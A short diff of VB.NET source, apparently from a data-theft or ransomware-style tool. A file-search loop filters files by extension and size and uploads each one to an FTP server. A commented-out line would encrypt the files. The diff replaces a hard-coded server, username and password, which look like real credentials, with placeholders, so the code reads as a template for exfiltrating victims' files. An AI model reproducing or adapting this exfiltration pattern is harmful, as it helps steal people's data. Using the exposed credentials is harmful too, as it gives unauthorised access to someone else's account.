@@ -60,7 +60,7 @@ Public Class clsSearch
                 If CheckExtension(sfile, clsS.sExtensionFilter) Then
                     If CheckFileSize(sfile) < clsS.MAX_FILE_SIZE Then
                         Try
-                            clsFTP.UploadFile(sfile, "ftp://ftp.securebytes.com.co", "diegojojoa@securebytes.com.co", "$%8387Jojoa")
+                    clsFTP.UploadFile(sfile, "ftp://ftp.YOURFTP.com", "YOURUSERNAME", "YOURPASSWORD")
                             'clsCrypto.Encrypt(sfile, clsS.bytPK, clsS.bytSK)
                         Catch exUnathorized As UnauthorizedAccessException
 
